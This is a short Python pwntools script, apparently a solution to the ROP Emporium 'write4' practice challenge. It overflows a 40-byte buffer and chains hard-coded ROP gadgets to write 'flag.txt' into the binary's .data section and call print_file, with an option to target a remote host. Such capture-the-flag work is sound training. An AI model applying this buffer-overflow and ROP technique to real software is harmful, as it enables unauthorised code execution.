#!/usr/bin/python3

from pwn import *

local = True
filename = './write4'
hostname = 'hostname'
port = 1234

e = ELF(filename)

# Function
print_func = e.symbols.print_file
print(f'Address of print_file: {hex(print_func)}')

# Gadgets
mov = 0x400628 # mov qword ptr [r14], r15; ret;
ret = 0x4004e6 # ret;
rdi = 0x400693 # pop rdi; ret;
r14_15 = 0x400690 # pop r14; pop r15; ret;

# Read-Write Section
rw_section = 0x601028 # -rw- .data

if local:
    p = process(filename)
else:
    p = remote(hostname, port)

# Add offset to get to the buffer overflow
payload = 40 * b'A'
# Put rw_section .data into r14, and 'flag.txt' into r15
payload += p64(r14_15)
payload += p64(rw_section)
payload += b'flag.txt'
# Move flag.txt (r15) into .data (r14)
payload += p64(mov)
# Put rw_section .data into rdi, rw_section now has 'flag.txt'
payload += p64(rdi)
payload += p64(rw_section)
# Call print_func, it takes one argument, which we already put in rdi
payload += p64(print_func)

p.sendafter(b'> ', payload)
result = p.recvall(timeout=2)
print(result)
